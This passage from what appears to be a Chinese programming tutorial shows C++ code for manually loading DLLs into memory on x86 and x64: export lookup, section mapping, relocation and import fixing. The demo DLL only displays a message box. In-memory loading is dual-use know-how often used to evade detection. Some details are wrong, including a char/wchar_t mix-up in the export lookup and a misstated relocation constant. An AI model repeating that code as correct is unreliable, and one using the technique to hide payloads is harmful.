DWORD   AddressOfNames;         <span class="comment">// RVA from base of image（导出的函数名称表）</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image（导出的函数序号表）</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>遍历流程</strong></p><ol><li>获取导出函数名称;</li><li>比较是否是要找函数名称;</li><li>如果是, 则获取函数序号(2字节);</li><li>根据函数序号获取函数地址;</li></ol></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">MmGetProcAddress</span><span class="params">(LPVOID lpBaseAddress, <span class="type">wchar_t</span>* lpszFuncName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD)pDos);</span><br><span class="line"></span><br><span class="line">    PDWORD dwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)pDos);</span><br><span class="line">    PDWORD dwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)pDos);</span><br><span class="line">    PWORD pwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)pDos);</span><br><span class="line"></span><br><span class="line">    DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumberOfNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!dwAddressOfFunctions[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        PWCHAR szFuncName = (PWCHAR)(dwAddressOfNames[i] + (DWORD)pDos);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">lstrcmpi</span>(lpszFuncName, szFuncName) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (LPVOID)(dwAddressOfFunctions[pwAddressOfNameOrdinals[i]] + (DWORD)pDos);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">LPVOID</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-释放内存加载的Dll"><a href="#8-释放内存加载的Dll" class="headerlink" title="8. 释放内存加载的Dll"></a>8. 释放内存加载的Dll</h3><p>释放资源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MmFreeLibrary</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL bRet = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == lpBaseAddress)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line">bRet = <span class="built_in">VirtualFree</span>(lpBaseAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">lpBaseAddress = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存加载Dll执行演示"><a href="#内存加载Dll执行演示" class="headerlink" title="内存加载Dll执行演示"></a>内存加载Dll执行演示</h2><h3 id="示例Dll源代码"><a href="#示例Dll源代码" class="headerlink" title="示例Dll源代码"></a>示例Dll源代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function"><span class="type">void</span> <span class="title">ShowMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;I&#x27;m DLL File&quot;</span>, <span class="string">L&quot;HELLO&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PELoader-Demo-cpp"><a href="#PELoader-Demo-cpp" class="headerlink" title="PELoader_Demo.cpp"></a>PELoader_Demo.cpp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PELoader_Demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MmLoadDll.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span> szFileName[MAX_PATH] = <span class="string">L&quot;C:\\Users\\dell\\OneDrive\\桌面\\哔哩哔哩学习\\PE Learn\\PELoader_Demo\\Debug\\TestDLL_01.dll&quot;</span>;</span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">        szFileName, </span><br><span class="line">        GENERIC_READ | GENERIC_WRITE, </span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE, </span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        OPEN_EXISTING, </span><br><span class="line">        FILE_ATTRIBUTE_ARCHIVE, </span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;FileSize: %d\n&quot;</span>, dwFileSize);</span><br><span class="line">    <span class="comment">// 申请动态内存并读取DLL到内存中</span></span><br><span class="line">    PBYTE lpData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">    <span class="keyword">if</span> (lpData == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;申请内存出错: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">    BOOL bRet =  <span class="built_in">ReadFile</span>(hFile, lpData, dwFileSize, &amp;dwRet, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lpData: %08x\n&quot;</span>, *(<span class="type">short</span>*)lpData);</span><br><span class="line">    <span class="comment">// 将内存DLL加载到程序中</span></span><br><span class="line">    LPVOID lpBaseAddress = <span class="built_in">MmLoadLibrary</span>(lpData, dwFileSize);</span><br><span class="line">    <span class="keyword">if</span> (lpBaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;MmLoadLibrary Failed: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DLL加载成功\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取DLL导出函数并调用</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*typedef_ShowMessage)</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* szName = <span class="string">&quot;ShowMessage&quot;</span>;</span><br><span class="line">    typedef_ShowMessage ShowMessage = (typedef_ShowMessage)<span class="built_in">MmGetProcAddress</span>(lpBaseAddress, (<span class="type">wchar_t</span>*)szName);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == ShowMessage)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;MmGetProcAddress Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ShowMessage</span>();</span><br><span class="line">    <span class="comment">// 释放从内存加载的DLL</span></span><br><span class="line">    BOOL bRet1 = <span class="built_in">MmFreeLibrary</span>(lpBaseAddress);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;MmFreeLibrary Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 释放</span></span><br><span class="line">    <span class="keyword">delete</span>[] lpData;</span><br><span class="line">    lpData = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用导出函数"><a href="#调用导出函数" class="headerlink" title="调用导出函数"></a>调用导出函数</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/%E8%B0%83%E7%94%A8%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0.png' data-fancybox='default' data-caption='调用导出函数'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/%E8%B0%83%E7%94%A8%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/%E8%B0%83%E7%94%A8%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="调用导出函数"></a><span class='image-caption'>调用导出函数</span></div></div><h3 id="内存加载exe执行"><a href="#内存加载exe执行" class="headerlink" title="内存加载exe执行"></a>内存加载exe执行</h3><p>待补充…</p><h2 id="x64位手工模拟PE加载器"><a href="#x64位手工模拟PE加载器" class="headerlink" title="x64位手工模拟PE加载器"></a>x64位手工模拟PE加载器</h2><div class="note info"><p><strong>x64位手工模拟PE加载器</strong></p><p>实现原理和x32位相同, 需注意的是在修复重定位时判断是否进行修复时: x64位修复项等于0x10; x86位(IMAGE_REL_BASED_HIGHLOW)等于0x3;</p></div><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LoadPE_Demo_x64.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* typedef_DllMain)</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取SizeOfImage</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetSizeOfImage</span><span class="params">(LPVOID lpBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBuffer);</span><br><span class="line"><span class="keyword">return</span> pNt-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将fileBuffer转成ImageBuffer</span></span><br><span class="line"><span class="function">BOOL <span class="title">MemMapFile</span><span class="params">(LPVOID lpBuffer, LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBuffer);</span><br><span class="line">PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line">DWORD dwSizeOfHeaders = pNt-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">DWORD dwSizeOfSections = pNt-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(lpBaseAddress, lpBuffer, dwSizeOfHeaders);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwSizeOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((pSec[i].VirtualAddress == <span class="number">0</span>) || (pSec[i].SizeOfRawData == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID lpSrcMem = (LPVOID)(pSec[i].PointerToRawData + (DWORD64)lpBuffer);</span><br><span class="line">LPVOID lpDesMem = (LPVOID)(pSec[i].VirtualAddress + (DWORD64)lpBaseAddress);</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(lpDesMem, lpSrcMem, pSec[i].SizeOfRawData);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修复重定位表</span></span><br><span class="line"><span class="function">BOOL <span class="title">FixRelocation</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBaseAddress);</span><br><span class="line">PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line">PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(pDir-&gt;VirtualAddress + (DWORD64)lpBaseAddress);</span><br><span class="line"><span class="keyword">if</span> ((LPVOID)pBaseReloc == lpBaseAddress)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;不存在重定位表\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (pBaseReloc-&gt;VirtualAddress != <span class="number">0</span> &amp;&amp; pBaseReloc-&gt;SizeOfBlock != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">PWORD pLocData = (PWORD)((DWORD64)pBaseReloc + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line">DWORD dwNumOfReloc = (pBaseReloc-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumOfReloc; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// x64位修复项等于0x10 x86 IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line"><span class="keyword">if</span>((pLocData[i] &gt;&gt; <span class="number">12</span>) == IMAGE_REL_BASED_DIR64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>* pAddress = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)((PBYTE)pDos + pBaseReloc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fix Relocation: %08x\t %p\n&quot;</span>, (pLocData[i] &gt;&gt; <span class="number">12</span>), pAddress);</span><br><span class="line">ULONGLONG dwDelta = (ULONGLONG)pDos - pNt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">*pAddress += dwDelta;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pBaseReloc + pBaseReloc-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修正导入表</span></span><br><span class="line"><span class="function">BOOL <span class="title">FixImportTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBaseAddress);</span><br><span class="line">PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pDir-&gt;VirtualAddress + (DWORD64)lpBaseAddress);</span><br><span class="line"><span class="type">int</span> wcharSize = <span class="number">0</span>;</span><br><span class="line">WCHAR wcDllName[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">PIMAGE_THUNK_DATA pINT = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME pName = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_THUNK_DATA pIAT = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC lpFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span> (pImport-&gt;Name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* szDllName = (<span class="type">char</span>*)(pImport-&gt;Name + (DWORD64)lpBaseAddress);</span><br><span class="line">wcharSize = <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, szDllName, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">wsprintf</span>(wcDllName, <span class="string">L&quot;%S&quot;</span>, szDllName);</span><br><span class="line"><span 